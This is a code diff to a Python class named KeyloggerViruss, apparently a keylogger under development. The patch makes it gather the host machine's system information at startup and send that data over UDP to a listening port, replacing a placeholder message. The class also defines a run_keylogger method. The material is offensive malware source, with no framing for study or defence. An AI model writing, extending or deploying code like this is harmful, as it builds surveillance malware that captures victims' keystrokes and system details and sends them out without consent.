@@ -20,6 +20,7 @@ class KeyloggerViruss():
     def __init__(self, host: str = "127.0.0.1", port_listen: int = 9998, port_send: int = 9999):
         self.host = host
         self.ip_self = get_all_local_ips(target_ip=IP)[0]['ip']
+        self.info_self = get_system_info(target_ip=IP)
         self.port_listen = port_listen
         self.port_send = port_send
         self.FLAG_ACTIVE = False
@@ -79,8 +80,7 @@ class KeyloggerViruss():
 
     def start_session(self):
         # self.start_monitor()
-        message = get_system_info(target_ip=IP)
-        self.send_udp_message(message="lol", signal=False)
+        self.send_udp_message(message=self.info_self, signal=False)
 
 
     def run_keylogger(self, buffer_size: int = 4096):
